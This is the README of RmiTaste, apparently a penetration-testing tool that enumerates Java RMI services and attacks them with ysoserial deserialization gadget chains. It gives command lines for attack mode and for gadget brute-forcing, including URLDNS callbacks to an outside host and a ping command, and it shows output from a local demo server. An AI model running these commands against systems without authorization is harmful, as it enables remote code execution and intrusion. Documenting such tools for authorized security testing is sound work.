<p align="center">
  <img src="assets/rmitastepsd_white.png" width=200 height=300>
</p>

#
![License](https://img.shields.io/badge/license-MIT-lightgrey.svg)
# RmiTaste
 RmiTaste allows security professionals to detect, enumerate, interact and attack RMI services by calling remote methods with gadgets from ysoserial. It also allows to call remote method with specific parameters.
 
### Disclaimer
 RmiTaste was written to aid security professionals in identifying insecure RMI services on systems which the user has prior permission to attack. Unauthorised access to computer systems is illegal and RmiTaste must be used in accordance with all relevant laws. Failure to do so could lead to you being prosecuted. The developers of RmiTaste assume no liability and are not responsible for any misuse or damage caused by this program.

## Building and Running
 1. Download ysoserial-master-SNAPSHOT.jar and save it in libs_attack directory (https://github.com/frohoff/ysoserial).
 2. Build project using maven:
    ```bash
    mvn package
    ```
 3. Run command:
    ```bash
    java -cp ".:libs_attack/*:target/rmitaste-1.0-SNAPSHOT-all.jar" m0.rmitaste.RmiTaste -h
    
    
     __________        ._____________                __
     \______   \ _____ |__\__    ___/____    _______/  |_  ____
     |       _//     \|  | |    |  \__  \  /  ___/\   __\/ __ \
     |    |   \  Y Y  \  | |    |   / __ \_\___ \  |  | \  ___/
     |____|_  /__|_|  /__| |____|  (____  /____  > |__|  \___  >
           \/      \/                  \/     \/            \/
     @author Marcin Ogorzelski (mzero - @_mzer0) STM Solutions
    
    Warning: RmiTaste was written to aid security professionals in identifying the
             insecure use of RMI services on systems which the user has prior
             permission to attack. RmiTaste must be used in accordance with all
             relevant laws. Failure to do so could lead to your prosecution.
             The developers assume no liability and are not responsible for any
             misuse or damage caused by this program.
    
    ```
  
## Usage

RmiTaste has 4 modes: conn, enum, attack and call. Each mode has a separate help.
```bash
java -cp ".:libs_attack/*:target/rmitaste-1.0-SNAPSHOT-all.jar" m0.rmitaste.RmiTaste -h
(...)
Usage: <main class> [-h] [COMMAND]
  -h, --help   display this help message
Commands:
  conn    check connection to host
  enum    enumerate RMI service
  attack  attack RMI registry methods
  call    call specific method on RMI remote object
```
### conn mode
Conn mode allows to check if port is RMI service port.
```bash
# Check if 127.0.0.1:1099 is RMI Service
java -cp ".:libs_attack/*:target/rmitaste-1.0-SNAPSHOT-all.jar" m0.rmitaste.RmiTaste conn -t 127.0.0.1 -p 1099
```
### enum mode
Enum mode allows to fetch information about RMI service such as: remote objects names and classes names that remote object implements or extends. If interface implemented by remote object is available in RmiTaste classpath then RmiTaste will print all remote methods that you can call on this remote object.
```bash
# RMI service enumeration
java -cp ".:libs_attack/*:target/rmitaste-1.0-SNAPSHOT-all.jar" m0.rmitaste.RmiTaste enum -t 127.0.0.1 -p 1099
```
### attack mode
Attack mode allows to call remote method with specific gadget chain from ysoserial. Assume that remote object has following methods:
```bash
acc1 [object] [127.0.1.1:38293] 
         implements java.rmi.Remote [interface]
         extends java.lang.reflect.Proxy [class]
         implements m0.rmitaste.example.server.ClientAccount [interface]
                setPin(java.lang.String param0); [method]
                        Parameters: param0;  may be vulnerable to Java Deserialization! [info]
                getBalance(); [method]
                deposit(java.lang.Object param0); [method]
                        Parameters: param0;  may be vulnerable to Java Deserialization! [info]
                withdraw(float param0); [method]
```

```bash
# Call all remote methods with URLDNS gadget as parameter
java -cp ".:libs_attack/*:target/rmitaste-1.0-SNAPSHOT-all.jar" m0.rmitaste.RmiTaste attack -t 127.0.0.1 -p 1099 -g "URLDNS" -c "http://rce.mzero.pl"
```

```bash
# Call acc1:m0.rmitaste.example.server.ClientAccount:deposit method with URLDNS gadget as parameter
java -cp ".:libs_attack/*:target/rmitaste-1.0-SNAPSHOT-all.jar" m0.rmitaste.RmiTaste attack -t 127.0.0.1 -p 1099 -m "acc1:m0.rmitaste.example.server.ClientAccount:deposit" -g "URLDNS" -c "http://rce.mzero.pl"
```


Option "-gen bruteforce" allows to brute force remote method with gadgets from ysoserial. In this example deposit method will be called multiple times with gadgets from ysoserial.
```bash
# Call acc1:m0.rmitaste.example.server.ClientAccount:deposit method with gadgets from ysoserial and command ping 127.0.0.1
java -cp ".:libs_attack/*:target/rmitaste-1.0-SNAPSHOT-all.jar" m0.rmitaste.RmiTaste attack -t 127.0.0.1 -p 1099 -m "acc1:m0.rmitaste.example.server.ClientAccount:deposit" -gen bruteforce -c "ping 127.0.0.1"
```
### call mode
Call mode allows to call specific method on RMI remote object. Assume that remote object has following methods:
```bash
acc1 [object] [127.0.1.1:38293] 
         implements java.rmi.Remote [interface]
         extends java.lang.reflect.Proxy [class]
         implements m0.rmitaste.example.server.ClientAccount [interface]
                setPin(java.lang.String param0); [method]
                        Parameters: param0;  may be vulnerable to Java Deserialization! [info]
                getBalance(); [method]
                deposit(java.lang.Object param0); [method]
                        Parameters: param0;  may be vulnerable to Java Deserialization! [info]
                withdraw(float param0); [method]
```

```bash
# Call m0.rmitaste.example.server.ClientAccount.getBalance method on acc1 remote object
java -cp ".:libs_attack/*:target/rmitaste-1.0-SNAPSHOT-all.jar" m0.rmitaste.RmiTaste call -t 127.0.0.1 -p 1099 -m "acc1:m0.rmitaste.example.server.ClientAccount:getBalance"
```

```bash
# Call m0.rmitaste.example.server.ClientAccount.setPin("1234") method on acc1 remote object
java -cp ".:libs_attack/*:target/rmitaste-1.0-SNAPSHOT-all.jar" m0.rmitaste.RmiTaste call -t 127.0.0.1 -p 1099 -m "acc1:m0.rmitaste.example.server.ClientAccount:setPin" -mp "string=1234"
```

### Examples
Demo server is available <a href="https://github.com/STMSolutions/RmiServerExample">here</a>.

 1. Run demo server.
  
 2. Enumerate target.
  
  ```bash
  root@keyisinyourmind:/media/sf_pentest2/Tools/python/Toolset/Others/RmiTasteTool# java -cp ".:libs_attack/*:target/rmitaste-1.0-SNAPSHOT-all.jar" m0.rmitaste.RmiTaste enum -t 127.0.0.1 -p 1099
 acc1 [object] [127.0.1.1:42881] 
	 extends java.rmi.server.RemoteObjectInvocationHandler [class]
	 implements java.rmi.Remote [interface]
	 extends java.lang.reflect.Proxy [class]
	 extends java.rmi.server.RemoteObject [class]
	 implements m0.rmitaste.example.server.ClientAccount [interface]
		No methods found. I don't have remote object interface. Give it to me!

 acc2 [object] [127.0.1.1:42881] 
	 extends java.rmi.server.RemoteObjectInvocationHandler [class]
	 implements java.rmi.Remote [interface]
	 extends java.lang.reflect.Proxy [class]
	 extends java.rmi.server.RemoteObject [class]
	 implements m0.rmitaste.example.server.ClientAccount [interface]
		No methods found. I don't have remote object interface. Give it to me!
  ```
 As you can see, RmiTaste needs interface of remote object. During pentests you will have to find this interface. In this example, just copy rmitaste.examples-1.0-SNAPSHOT-all.jar to libs_attack directory.
 Enumerate target again:
  ```bash
 acc1 [object] [127.0.1.1:42881] 
	 extends java.rmi.server.RemoteObjectInvocationHandler [class]
	 implements java.rmi.Remote [interface]
	 extends java.lang.reflect.Proxy [class]
	 extends java.rmi.server.RemoteObject [class]
	 implements m0.rmitaste.example.server.ClientAccount [interface]
		setPin(java.lang.String param0); [method]
			Parameters: param0;  may be vulnerable to Java Deserialization! [info]
		getBalance(); [method]
		deposit(java.lang.Object param0); [method]
			Parameters: param0;  may be vulnerable to Java Deserialization! [info]
		withdraw(float param0); [method]

 acc2 [object] [127.0.1.1:42881] 
	 extends java.rmi.server.RemoteObjectInvocationHandler [class]
	 implements java.rmi.Remote [interface]
	 extends java.lang.reflect.Proxy [class]
	 extends java.rmi.server.RemoteObject [class]
	 implements m0.rmitaste.example.server.ClientAccount [interface]
		setPin(java.lang.String param0); [method]
			Parameters: param0;  may be vulnerable to Java Deserialization! [info]
		getBalance(); [method]
		deposit(java.lang.Object param0); [method]
			Parameters: param0;  may be vulnerable to Java Deserialization! [info]
		withdraw(float param0); [method]

  ```

## Author
Twitter: <a href="https://twitter.com/_mzer0">@_mzer0</a>